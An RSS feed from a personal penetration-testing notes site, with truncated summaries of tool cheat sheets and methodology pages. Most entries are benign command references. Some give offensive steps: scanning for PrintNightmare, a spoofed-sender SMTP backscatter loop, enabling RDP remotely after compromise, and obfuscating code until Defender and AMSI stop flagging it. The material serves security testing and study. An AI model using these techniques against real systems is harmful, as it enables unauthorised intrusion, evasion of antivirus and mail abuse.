<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>My notes and snippets</title><link>https://notes.justin-p.me/</link><description>Recent content on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 10 Sep 2021 14:38:50 +0200</lastBuildDate><atom:link href="https://notes.justin-p.me/index.xml" rel="self" type="application/rss+xml"/><item><title>printnightmare</title><link>https://notes.justin-p.me/guides/printnightmare/</link><pubDate>Fri, 10 Sep 2021 14:38:50 +0200</pubDate><guid>https://notes.justin-p.me/guides/printnightmare/</guid><description>Printnightmare Requirements A user account. (privs don&amp;rsquo;t mather)
Scan RPC Dump If you can reach these RPC interfaces you might be able to use printnightmare.
rpcdump.py @ip | egrep 'MS-RPRN|MS-PAR' It Was All A Dream https://github.com/byt3bl33d3r/ItWasAllADream
git clone https://github.com/byt3bl33d3r/ItWasAllADream cd ItWasAllADream &amp;amp;&amp;amp; docker build -t itwasalladream . docker run -it itwasalladream -u user -p password -d domain 192.168.1.0/24 docker cp &amp;lt;container-id&amp;gt;:/report_XXXXXXX ./ Setup tool for remote RCE (cube0x0) Ensure you have a impacket version that has this PR merged.</description></item><item><title>chisel</title><link>https://notes.justin-p.me/cheatsheets/tools/chisel/</link><pubDate>Fri, 03 Sep 2021 11:34:00 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/chisel/</guid><description>chisel Installation https://github.com/jpillora/chisel/releases Docker docker run --rm -it jpillora/chisel --help go get go get -v github.com/jpillora/chisel Usage Server chisel server [options] Client chisel client [options] &amp;lt;server&amp;gt; &amp;lt;remote&amp;gt; [remote] [remote] .. Flags Server --host, Defines the HTTP listening host â€“ the network interface (defaults the environment variable HOST and falls back to 0.0.0.0). --port, -p, Defines the HTTP listening port (defaults to the environment variable PORT and fallsback to port 8080).</description></item><item><title>aria2</title><link>https://notes.justin-p.me/cheatsheets/tools/aria2/</link><pubDate>Thu, 02 Sep 2021 20:40:45 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/aria2/</guid><description>aria2 Installation apt install aria2 Usage aria2c [OPTIONS] [URI | MAGNET | TORRENT_FILE | METALINK_FILE]... Flags -v, --version Print the version number and exit. Tags: #basic -h, --help[=TAG|KEYWORD] Print usage and exit. The help messages are classified with tags. A tag starts with &amp;quot;#&amp;quot;. For example, type &amp;quot;--help=#http&amp;quot; to get the usage for the options tagged with &amp;quot;#http&amp;quot;. If non-tag word is given, print the usage for the options whose name includes that word.</description></item><item><title>hcxtools</title><link>https://notes.justin-p.me/cheatsheets/tools/hcxtools/</link><pubDate>Thu, 02 Sep 2021 20:17:35 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/hcxtools/</guid><description>hcxtools Installation git clone https://github.com/ZerBea/hcxtools cd hcxtools sudo apt install libpcap-dev libcurl4-openssl-dev libssl-dev make sudo make install Usage ./hcxpcapngtool [OPTIONS] Flags short options: -o &amp;lt;file&amp;gt; : output WPA-PBKDF2-PMKID+EAPOL hash file (hashcat -m 22000) get full advantage of reuse of PBKDF2 on PMKID and EAPOL -E &amp;lt;file&amp;gt; : output wordlist (autohex enabled on non ASCII characters) to use as input wordlist for cracker retrieved from every frame that contain an ESSID -R &amp;lt;file&amp;gt; : output wordlist (autohex enabled on non ASCII characters) to use as input wordlist for cracker retrieved from PROBEREQUEST frames only -I &amp;lt;file&amp;gt; : output unsorted identity list to use as input wordlist for cracker -U &amp;lt;file&amp;gt; : output unsorted username list to use as input wordlist for cracker -D &amp;lt;file&amp;gt; : output device information list format MAC MANUFACTURER MODELNAME SERIALNUMBER DEVICENAME -h : show this help -v : show version long options: --all : convert all possible hashes instead of only the best one that can lead to much overhead hashes use hcxhashtool to filter hashes need hashcat --nonce-error-corrections &amp;gt;= 8 --eapoltimeout=&amp;lt;digit&amp;gt; : set EAPOL TIMEOUT (milliseconds) : default: 5000 ms --nonce-error-corrections=&amp;lt;digit&amp;gt; : set nonce error correction warning: values &amp;gt; 0 can lead to uncrackable handshakes : default: 0 --ignore-ie : do not use CIPHER and AKM information this will convert all frames regadless of CIPHER and/OR AKM information, and can lead to uncrackable hashes --max-essids=&amp;lt;digit&amp;gt; : maximum allowed ESSIDs default: 1 ESSID disregard ESSID changes and take ESSID with highest ranking --eapmd5=&amp;lt;file&amp;gt; : output EAP MD5 CHALLENGE (hashcat -m 4800) --eapmd5-john=&amp;lt;file&amp;gt; : output EAP MD5 CHALLENGE (john chap) --eapleap=&amp;lt;file&amp;gt; : output EAP LEAP and MSCHAPV2 CHALLENGE (hashcat -m 5500, john netntlm) --tacacs-plus=&amp;lt;file&amp;gt; : output TACACS PLUS (hashcat -m 16100, john tacacs-plus) --nmea=&amp;lt;file&amp;gt; : output GPS data in NMEA format format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL to convert it to gpx, use GPSBabel: gpsbabel -i nmea -f hcxdumptool.</description></item><item><title>Search-That-Hash</title><link>https://notes.justin-p.me/cheatsheets/tools/search-that-hash/</link><pubDate>Thu, 02 Sep 2021 20:02:34 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/search-that-hash/</guid><description>Search-That-Hash Installation pip3 install search-that-hash Usage sth [OPTIONS] Flags -t, --text TEXT Crack a single hash. -f, --file FILENAME The file of hashes, seperated by newlines. -w, --wordlist TEXT The wordlist you want to use for Hashcat. --timeout INTEGER Choose timeout in seconds. -g, --greppable Prints as JSON, use this to grep. --hashcat_binary TEXT Location of hashcat folder (if using windows). -o, --offline Use offline mode. Does not search for hashes in APIs.</description></item><item><title>Name-That-Hash</title><link>https://notes.justin-p.me/cheatsheets/tools/name-that-hash/</link><pubDate>Thu, 02 Sep 2021 19:51:37 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/name-that-hash/</guid><description>name-that-hash Installation pip3 install name-that-hash Usage nth [OPTIONS] Flags Options: -t, --text TEXT Check one hash, use single quotes ' as inverted commas &amp;quot; messes up on Linux. -f, --file FILENAME Checks every hash in a newline separated file. -g, --greppable Are you going to grep this output? Prints in JSON format. -b64, --base64 Decodes hashes in Base64 before identification. For files with mixed Base64 &amp;amp; non-encoded it attempts base64 first and then falls back to normal hash identification per hash.</description></item><item><title>ciphey</title><link>https://notes.justin-p.me/cheatsheets/tools/ciphey/</link><pubDate>Thu, 02 Sep 2021 19:47:20 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/ciphey/</guid><description>ciphey Installation python3 -m pip install ciphey --upgrade docker run -it --rm remnux/ciphey Usage ciphey [OPTIONS] [TEXT_STDIN] Flags Options: -t, --text TEXT The ciphertext you want to decrypt. -q, --quiet Decrease verbosity -g, --greppable Only print the answer (useful for grep) -v, --verbose -C, --checker TEXT Use the given checker -c, --config TEXT Uses the given config file. Defaults to appdirs.user_config_dir('ciphey', 'ciphey')/'config.yml' -w, --wordlist TEXT Uses the given wordlist -p, --param TEXT Passes a parameter to the language checker -l, --list-params BOOLEAN List the parameters of the selected module --searcher TEXT Select the searching algorithm to use -b, --bytes Forces ciphey to use binary mode for the input --default-dist TEXT Sets the default character/byte distribution -m, --module PATH Adds a module from the given path -A, --appdirs Print the location of where Ciphey wants the settings file to be -f, --file FILENAME --help Show this message and exit.</description></item><item><title>Malware Test VM</title><link>https://notes.justin-p.me/notes/methodology/general/avbypass/malwaretestvm/</link><pubDate>Thu, 02 Sep 2021 17:11:54 +0200</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/avbypass/malwaretestvm/</guid><description>Malware Test VM Setup Install Windows VM Fully update VM Install WFC Attachments wfc6.7.0.0.setup.exe (2737 kb) Configure WFC to block all inbound and outbound connections (high filtering) (optional) add additional tooling Create snapshot How to use Create clone of V Disable WFC and fully update VM Install any additional AV if you are not testing against defender Activate WFC Create rule in WFC that allows outbound traffic to C2 infra Test malware Remove VM clone Related pages Name Description ThreatCheck Modified version of Matterpreter&amp;#39;s DefenderCheck.</description></item><item><title>backscatter</title><link>https://notes.justin-p.me/notes/random/backscatter/</link><pubDate>Thu, 02 Sep 2021 17:11:21 +0200</pubDate><guid>https://notes.justin-p.me/notes/random/backscatter/</guid><description>backscatter Examples Single test nc &amp;lt;mailhost&amp;gt; 25 EHLO domain.tld MAIL FROM:victim@domain.tld RCPT TO:notexistingmailbox@domain.tld DATA backscattering is fun . Automated test Create a file with this content (backscatter.txt)
EHLO example.com MAIL FROM:victim@example.com RCPT TO:notexistingmailbox@target.com DATA backscattering is fun . #!/bin/sh while true; do cat backscatter.txt | while read L; do sleep &amp;quot;1&amp;quot;; echo &amp;quot;$L&amp;quot;; done | &amp;quot;nc&amp;quot; -w 3 -C -v &amp;quot;&amp;lt;mailhost&amp;gt;&amp;quot; &amp;quot;25&amp;quot;; done</description></item><item><title>ThreatCheck</title><link>https://notes.justin-p.me/cheatsheets/tools/threatcheck/</link><pubDate>Thu, 02 Sep 2021 17:03:44 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/threatcheck/</guid><description>ThreatCheck Installation git clone https://github.com/rasta-mouse/ThreatCheck # and build using visual studio Usage ThreatCheck.exe [FILE] [OPTIONS] Determine the line(s) of code that are being flagged by Defender.
Obfuscate the detected line(s) of code so it is no longer flagged by Defender.
Flags -e, --engine (Default: Defender) Scanning engine. Options: Defender, AMSI -f, --file Analyze a file on disk -u, --url Analyze a file from a URL --help Display this help screen.</description></item><item><title>AMSITrigger</title><link>https://notes.justin-p.me/cheatsheets/tools/amsitrigger/</link><pubDate>Thu, 02 Sep 2021 16:35:19 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/amsitrigger/</guid><description>AMSITrigger Installation git clone https://github.com/RythmStick/AMSITrigger # and build using visual studio or download release from https://github.com/RythmStick/AMSITrigger/releases
Place the AMSITrigger.exe and the PS file you want to check in a whitelisted folder.
Usage .\AmsiTrigger_x64.exe [PowerShell File] [OPTIONS] Flags -i, --inputfile=VALUE Powershell filename -u, --url=VALUE URL eg. https://10.1.1.1/Invoke-NinjaCopy.ps1 -f, --format=VALUE Output Format: 1 - Only show Triggers 2 - Show Triggers with Line numbers 3 - Show Triggers inline with code 4 - Show AMSI calls (xmas tree mode) -d, --debug Show Debug Info -m, --maxsiglength=VALUE Maximum signature Length to cater for, default=2048 -c, --chunksize=VALUE Chunk size to send to AMSIScanBuffer, default=4096 -h, -?</description></item><item><title>docker</title><link>https://notes.justin-p.me/cheatsheets/tools/docker/</link><pubDate>Thu, 02 Sep 2021 14:13:26 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/docker/</guid><description>docker Installation sudo apt-get remove docker docker-engine docker.io containerd runc sudo apt-get update sudo apt-get install apt-transport-https ca-certificates curl gnupg lsb-release curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg echo &amp;quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&amp;quot; | sudo tee /etc/apt/sources.list.d/docker.list &amp;gt; /dev/null sudo apt-get update sudo apt-get install docker-ce docker-ce-cli containerd.io Usage Usage: docker [OPTIONS] COMMAND Flags Options: --config string Location of client config files (default &amp;quot;/home/justin-p/.</description></item><item><title>docker-compose</title><link>https://notes.justin-p.me/cheatsheets/tools/docker-compose/</link><pubDate>Thu, 02 Sep 2021 13:54:35 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/docker-compose/</guid><description>docker-compose Installation sudo curl -L &amp;quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;quot; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose Usage docker-compose [-f &amp;lt;arg&amp;gt;...] [options] [COMMAND] [ARGS...] Flags Options: -f, --file FILE Specify an alternate compose file (default: docker-compose.yml) -p, --project-name NAME Specify an alternate project name (default: directory name) -c, --context NAME Specify a context name --verbose Show more output --log-level LEVEL Set log level (DEBUG, INFO, WARNING, ERROR, CRITICAL) --no-ansi Do not print ANSI control characters -v, --version Print version and exit -H, --host HOST Daemon socket to connect to --tls Use TLS; implied by --tlsverify --tlscacert CA_PATH Trust certs signed only by this CA --tlscert CLIENT_CERT_PATH Path to TLS certificate file --tlskey TLS_KEY_PATH Path to TLS key file --tlsverify Use TLS and verify the remote --skip-hostname-check Don't check the daemon's hostname against the name specified in the client certificate --project-directory PATH Specify an alternate working directory (default: the path of the Compose file) --compatibility If set, Compose will attempt to convert keys in v3 files to their non-Swarm equivalent --env-file PATH Specify an alternate environment file Commands: build Build or rebuild services config Validate and view the Compose file create Create services down Stop and remove containers, networks, images, and volumes events Receive real time events from containers exec Execute a command in a running container help Get help on a command images List images kill Kill containers logs View output from containers pause Pause services port Print the public port for a port binding ps List containers pull Pull service images push Push service images restart Restart services rm Remove stopped containers run Run a one-off command scale Set number of containers for a service start Start services stop Stop services top Display the running processes unpause Unpause services up Create and start containers version Show the Docker-Compose version information Examples Build docker images docker-compose build .</description></item><item><title>Rdesktop</title><link>https://notes.justin-p.me/cheatsheets/tools/rdesktop/</link><pubDate>Wed, 01 Sep 2021 23:07:10 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/rdesktop/</guid><description>rdesktop Installation apt install rdesktop Usage rdesktop [options] server[:port] Flags -u: user name -d: domain -s: shell / seamless application to start remotely -c: working directory -p: password (- to prompt) -n: client hostname -k: keyboard layout on server (en-us, de, sv, etc.) -g: desktop geometry (WxH[@DPI][+X[+Y]]) -i: enables smartcard authentication, password is used as pin -f: full-screen mode -b: force bitmap updates -L: local codepage -A: path to SeamlessRDP shell, this enables SeamlessRDP mode -V: tls version (1.</description></item><item><title>rdp</title><link>https://notes.justin-p.me/notes/methodology/external/postexploit/rdp/</link><pubDate>Wed, 01 Sep 2021 22:56:49 +0200</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/postexploit/rdp/</guid><description>Remote Desktop Protocol You can enable (remotely) Remote Desktop (RDP) by adjusting the register key.
use wmiexec.py / smbexec.py or Evil-WinRM to preform the actions below.
Enable / disable Remote Desktop Enable reg add &amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f Disable reg add &amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f</description></item><item><title>Remote UAC</title><link>https://notes.justin-p.me/notes/methodology/external/postexploit/remoteuac/</link><pubDate>Wed, 01 Sep 2021 22:48:38 +0200</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/postexploit/remoteuac/</guid><description>Remote UAC UAC enables users to perform common day-to-day tasks as non-administrators. User accounts that are members of the local Administrators group will run most applications by using the principle of least privilege.
How UAC remote restrictions work To better protect those users who are members of the local Administrators group, microsoft implement UAC restrictions. This mechanism helps prevent you preforming tasks remotely with a local user account, for example, lateral movement using the IPC$ share.</description></item><item><title>runas</title><link>https://notes.justin-p.me/cheatsheets/windows/runas/</link><pubDate>Wed, 01 Sep 2021 22:06:23 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/windows/runas/</guid><description>runas Usage RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ] /user:UserName program RUNAS [ [/noprofile | /profile] [/env] [/savecred] ] /smartcard [/user:UserName] program RUNAS /showtrustlevels RUNAS /trustlevel:TrustLevel program Flags /noprofile Do not load the user's profile. This causes the application to load more quickly, but can cause some applications to malfunction. /profile Load the user's profile. (default) /env Use the current environment instead of user's. /netonly Use the credentials for remote access only.</description></item><item><title>NET</title><link>https://notes.justin-p.me/cheatsheets/windows/net/</link><pubDate>Wed, 01 Sep 2021 17:53:39 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/windows/net/</guid><description>NET ACCOUNTS / NET USER / NET GROUP Usage NET ACCOUNTS [/FORCELOGOFF:{minutes | NO} ] [/MINPWLENGTH:length] [/MAXPWAGE:{days | UNLIMITED}] [/MINPWAGE:days] [/UNIQUEPW:number] [/DOMAIN] Examples ACCOUNTS View the local password &amp;amp; logon policy. NET ACCOUNTS View the domain password &amp;amp; logon policy. NET ACCOUNTS /DOMAIN Set passwords to never expire. NET ACCOUNTS /MAXPWAGE:UNLIMITED /DOMAIN Examples USER View the password properties of user account &amp;lsquo;Ella&amp;rsquo; NET USER Ella View user account details NET USER [/DOMAIN] Add a user account.</description></item><item><title>watch</title><link>https://notes.justin-p.me/cheatsheets/unix/watch/</link><pubDate>Wed, 01 Sep 2021 17:36:17 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/watch/</guid><description>watch Usage watch [options] command Flags -b, --beep beep if command has a non-zero exit -c, --color interpret ANSI color and style sequences -d, --differences[=&amp;lt;permanent&amp;gt;] highlight changes between updates -e, --errexit exit if command has a non-zero exit -g, --chgexit exit when output from command changes -n, --interval &amp;lt;secs&amp;gt; seconds to wait between updates -p, --precise attempt run command in precise intervals -t, --no-title turn off header -x, --exec pass command to exec instead of &amp;quot;sh -c&amp;quot; -h, --help display this help and exit -v, --version output version information and exit Examples Watch &amp;lsquo;date&amp;rsquo; every 5 second watch -n 5 date Hide the header output watch -t &amp;lt;command&amp;gt; Highlight changes watch -d &amp;lt;command&amp;gt; Also see N/A</description></item><item><title>wc</title><link>https://notes.justin-p.me/cheatsheets/unix/wc/</link><pubDate>Wed, 01 Sep 2021 17:34:20 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/wc/</guid><description>wc Usage wc [OPTION]... [FILE]... Flags -c, --bytes print the byte counts -m, --chars print the character counts -l, --lines print the newline counts --files0-from=F read input from the files specified by NUL-terminated names in file F; If F is - then read names from standard input -L, --max-line-length print the maximum display width -w, --words print the word counts --help display this help and exit --version output version information and exit Examples Count lines in file wc -l file.</description></item><item><title>ntp</title><link>https://notes.justin-p.me/cheatsheets/unix/ntp/</link><pubDate>Wed, 01 Sep 2021 17:31:24 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/ntp/</guid><description>ntp Usage ntpq [-flags] [-flag [value]] [--option-name[[=| ]value]] [ host ...] Flags Flg Arg Option-Name Description -4 no ipv4 Force IPv4 name resolution - prohibits the option 'ipv6' -6 no ipv6 Force IPv6 name resolution - prohibits the option 'ipv4' -c Str command run a command and exit - may appear multiple times -d no debug-level Increase debug verbosity level - may appear multiple times -D Num set-debug-level Set the debug verbosity level - may appear multiple times -i no interactive Force ntpq to operate in interactive mode - prohibits these options: command peers -n no numeric numeric host addresses no old-rv Always output status line with readvar -p no peers Print a list of the peers - prohibits the option 'interactive' -r KWd refid Set default display type for S2+ refids -w no wide Display the full 'remote' value opt version output version information and exit -?</description></item><item><title>gpg</title><link>https://notes.justin-p.me/cheatsheets/unix/gpg/</link><pubDate>Wed, 01 Sep 2021 16:59:15 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/gpg/</guid><description>gpg Usage gpg [options] [files] Flags Commands: -s, --sign make a signature --clear-sign make a clear text signature -b, --detach-sign make a detached signature -e, --encrypt encrypt data -c, --symmetric encryption only with symmetric cipher -d, --decrypt decrypt data (default) --verify verify a signature -k, --list-keys list keys --list-signatures list keys and signatures --check-signatures list and check key signatures --fingerprint list keys and fingerprints -K, --list-secret-keys list secret keys --generate-key generate a new key pair --quick-generate-key quickly generate a new key pair --quick-add-uid quickly add a new user-id --quick-revoke-uid quickly revoke a user-id --quick-set-expire quickly set a new expiration date --full-generate-key full featured key pair generation --generate-revocation generate a revocation certificate --delete-keys remove keys from the public keyring --delete-secret-keys remove keys from the secret keyring --quick-sign-key quickly sign a key --quick-lsign-key quickly sign a key locally --sign-key sign a key --lsign-key sign a key locally --edit-key sign or edit a key --change-passphrase change a passphrase --export export keys --send-keys export keys to a keyserver --receive-keys import keys from a keyserver --search-keys search for keys on a keyserver --refresh-keys update all keys from a keyserver --import import/merge keys --card-status print the card status --edit-card change data on a card --change-pin change a card's PIN --update-trustdb update the trust database --print-md print message digests --server run in server mode --tofu-policy VALUE set the TOFU policy for a key Options: -a, --armor create ascii armored output -r, --recipient USER-ID encrypt for USER-ID -u, --local-user USER-ID use USER-ID to sign or decrypt -z N set compress level to N (0 disables) --textmode use canonical text mode -o, --output FILE write output to FILE -v, --verbose verbose -n, --dry-run do not make any changes -i, --interactive prompt before overwriting --openpgp use strict OpenPGP behavior Examples Generate keys gpg --gen-key List available keys gpg --list-keys Export public key gpg --export -a &amp;quot;&amp;lt;certificate-name-user&amp;gt;&amp;quot; &amp;gt; public.</description></item><item><title>ftp</title><link>https://notes.justin-p.me/cheatsheets/unix/ftp/</link><pubDate>Wed, 01 Sep 2021 16:00:46 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/ftp/</guid><description>ftp Usage ftp [[OPTIONS]] [hostname] Flags Usage: { ftp | pftp } [-46pinegvtd] [hostname] -4: use IPv4 addresses only -6: use IPv6, nothing else -p: enable passive mode (default for pftp) -i: turn off prompting during mget -n: inhibit auto-login -e: disable readline support, if present -g: disable filename globbing -v: verbose mode -t: enable packet tracing [nonfunctional] -d: enable debugging Examples Connect to FTP host ftp &amp;lt;host&amp;gt; List files ls Move around cd &amp;lt;dir&amp;gt; Download get &amp;lt;file&amp;gt; Upload (file should be in CWD where ftp was started, else use full path)</description></item><item><title>dig</title><link>https://notes.justin-p.me/cheatsheets/unix/dig/</link><pubDate>Wed, 01 Sep 2021 15:48:30 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/dig/</guid><description>dig Usage dig [OPTIONS] &amp;lt;target&amp;gt; Flags Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} {global-d-opt} host [@local-server] {local-d-opt} [ host [@local-server] {local-d-opt} [...]] Examples Default A lookup dig justin-p.me Short lookup dig justin-p.me +short TXT lookup dig txt justin-p.me +short Specify DNS server dig justin-p.me +short @8.8.8.8 Also see N/A</description></item><item><title>chmod</title><link>https://notes.justin-p.me/cheatsheets/unix/chmod/</link><pubDate>Wed, 01 Sep 2021 15:45:04 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/chmod/</guid><description>chmod Usage chmod OPTION... MODE[,MODE]... [FILE]... Flags Usage: chmod [OPTION]... MODE[,MODE]... FILE... or: chmod [OPTION]... OCTAL-MODE FILE... or: chmod [OPTION]... --reference=RFILE FILE... Change the mode of each FILE to MODE. With --reference, change the mode of each FILE to that of RFILE. -c, --changes like verbose but report only when a change is made -f, --silent, --quiet suppress most error messages -v, --verbose output a diagnostic for every file processed --no-preserve-root do not treat '/' specially (the default) --preserve-root fail to operate recursively on '/' --reference=RFILE use RFILEs mode instead of MODE values -R, --recursive change files and directories recursively --help display this help and exit --version output version information and exit Examples Change permissions of file.</description></item><item><title>apt</title><link>https://notes.justin-p.me/cheatsheets/unix/apt/</link><pubDate>Wed, 01 Sep 2021 15:38:25 +0200</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/apt/</guid><description>apt Usage apt [options] [command] Flags list - list packages based on package names search - search in package descriptions show - show package details install - install packages reinstall - reinstall packages remove - remove packages autoremove - Remove automatically all unused packages update - update list of available packages upgrade - upgrade the system by installing/upgrading packages full-upgrade - upgrade the system by removing/installing/upgrading packages edit-sources - edit the source information file satisfy - satisfy dependency strings Examples Update local repositories apt update Install all updates apt update Update specific package apt --only-upgrade install &amp;lt;package&amp;gt; Fix dependencies apt --fix-broken install Remove program and dependencies apt install -f &amp;lt;package&amp;gt;.</description></item><item><title>bettercap</title><link>https://notes.justin-p.me/cheatsheets/tools/bettercap/</link><pubDate>Thu, 04 Feb 2021 15:21:13 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/bettercap/</guid><description>Bettercap Installation sudo apt update sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev go get github.com/bettercap/bettercap cd $GOPATH/src/github.com/bettercap/bettercap make build sudo make install Usage Usage of /home/justin-p/go/bin/bettercap: -autostart string Comma separated list of modules to auto start. (default &amp;quot;events.stream&amp;quot;) -caplet string Read commands from this file and execute them in the interactive session. -cpu-profile file Write cpu profile file. -debug Print debug messages. -env-file string Load environment variables from this file if found, set to empty to disable environment persistence.</description></item><item><title>hugo</title><link>https://notes.justin-p.me/cheatsheets/tools/hugo/</link><pubDate>Tue, 26 Jan 2021 17:27:07 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/hugo/</guid><description>hugo Installation snap install hugo --channel=extended Usage hugo [command] [flags] Flags Usage: hugo [flags] hugo [command] Available Commands: config Print the site configuration convert Convert your content to different formats deploy Deploy your site to a Cloud provider. env Print Hugo version and environment info gen A collection of several useful generators. help Help about any command import Import your site from others. list Listing out various types of content mod Various Hugo Modules helpers.</description></item><item><title>century</title><link>https://notes.justin-p.me/notes/ctfs/underthewire/century/</link><pubDate>Tue, 29 Sep 2020 14:47:17 +0200</pubDate><guid>https://notes.justin-p.me/notes/ctfs/underthewire/century/</guid><description>Century Century 00 -&amp;gt; 01 Goal The goal of this level is to log into the game.
Solution sign up and get the creds.
$ ssh century1@century.underthewire.tech:century1
Under the Wire... PowerShell Training for the People!
PS C:\users\century1\desktop&amp;gt;
Century 01 -&amp;gt; 02 Goal The password for Century2 is the build version of the instance of PowerShell installed on this system.
NOTE:
- The format is as follows: **.*.*****.****
- Include all periods
- Be sure to look for build version and NOT PowerShell version Solution PS C:\users\century1\desktop&amp;gt; $PSVersionTable.</description></item><item><title>cyborg</title><link>https://notes.justin-p.me/notes/ctfs/underthewire/cyborg/</link><pubDate>Tue, 29 Sep 2020 14:47:17 +0200</pubDate><guid>https://notes.justin-p.me/notes/ctfs/underthewire/cyborg/</guid><description>cyborg cyborg 00 -&amp;gt; 01 Goal The goal of this level is to log into the game.
Solution sign up and get the creds.
$ ssh cyborg1@cyborg.underthewire.tech:cyborg1
Under the Wire... PowerShell Training for the People!
PS C:\users\cyborg1\desktop&amp;gt;
cyborg 01 -&amp;gt; 02 Goal The password for cyborg2 is the state that the user Chris Rogers is from as stated within Active Directory.
NOTE:
- The password will be lowercase no matter how it appears on screen.</description></item><item><title>Blackhat Python</title><link>https://notes.justin-p.me/notes/courses/blackhat-python/</link><pubDate>Mon, 24 Aug 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/courses/blackhat-python/</guid><description/></item><item><title>Breaching The Cloud</title><link>https://notes.justin-p.me/notes/courses/breaching-the-cloud/</link><pubDate>Mon, 24 Aug 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/courses/breaching-the-cloud/</guid><description/></item><item><title>Python4N00bs</title><link>https://notes.justin-p.me/notes/courses/python4n00bs/</link><pubDate>Mon, 24 Aug 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/courses/python4n00bs/</guid><description/></item><item><title>The Cyber Mentor</title><link>https://notes.justin-p.me/notes/courses/the-cyber-mentor/</link><pubDate>Mon, 24 Aug 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/courses/the-cyber-mentor/</guid><description/></item><item><title>whatweb</title><link>https://notes.justin-p.me/cheatsheets/tools/whatweb/</link><pubDate>Wed, 11 Mar 2020 16:20:49 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/whatweb/</guid><description>whatweb Installation Usage whatweb [options] &amp;lt;URLs&amp;gt; Flags TARGET SELECTION: &amp;lt;TARGETs&amp;gt; Enter URLs, hostnames, IP addresses, filenames or IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x format. --input-file=FILE, -i Read targets from a file. You can pipe hostnames or URLs directly with -i /dev/stdin. TARGET MODIFICATION: --url-prefix Add a prefix to target URLs. --url-suffix Add a suffix to target URLs. --url-pattern Insert the targets into a URL. Requires --input-file, eg. www.</description></item><item><title>Nmap</title><link>https://notes.justin-p.me/cheatsheets/tools/nmap/</link><pubDate>Wed, 11 Mar 2020 16:15:38 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/nmap/</guid><description>Nmap Installation apt install nmap Usage nmap [Scan Type(s)] [Options] {target specification} Flags TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL &amp;lt;inputfilename&amp;gt;: Input from list of hosts/networks -iR &amp;lt;num hosts&amp;gt;: Choose random targets --exclude &amp;lt;host1[,host2][,host3],...&amp;gt;: Exclude hosts/networks --excludefile &amp;lt;exclude_file&amp;gt;: Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &amp;lt;serv1[,serv2],.</description></item><item><title>theHarvester</title><link>https://notes.justin-p.me/cheatsheets/tools/theharvester/</link><pubDate>Wed, 11 Mar 2020 15:28:04 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/theharvester/</guid><description>theHarvester Installation git clone https://github.com/laramies/theHarvester cd theHarvester python3 -m pip install -r requirements/base.txt python3 theHarvester.py -h Usage theHarvester -d [domain] -l [depth] -b [search engine name] Flags -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: 